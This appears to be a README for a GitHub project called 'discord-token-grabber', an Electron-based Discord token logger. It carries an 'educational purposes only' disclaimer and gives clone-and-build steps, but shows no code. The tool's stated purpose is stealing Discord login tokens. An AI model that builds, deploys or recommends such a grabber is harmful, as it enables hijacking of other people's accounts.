# Ridiculous Token Logger
This is a some-what elaborate token logger.

# Disclaimer
This is just a toy project. Something for me to mess around with so I can learn more about Electron and Discord. I have put some effort into it, but this is merely a toy. I am not responsible for how YOU use this code, it is intended for learning and educational purposes only. Using this code for anything other than that is not recommended.
### So why make it?
For fun, and as a way fun/interesting way to learn more about Electron and Discord.

## How to get it working
- Run `git clone https://github.com/spinfal/discord-token-grabber.git`
- (optional) Rename the folder to change the Electron app name. **Do NOT set the folder name to `discord`. That will mess up your actual Discord installation and you will need to reinstall Discord.**
- Run `build.bat`
- Answer provided prompts
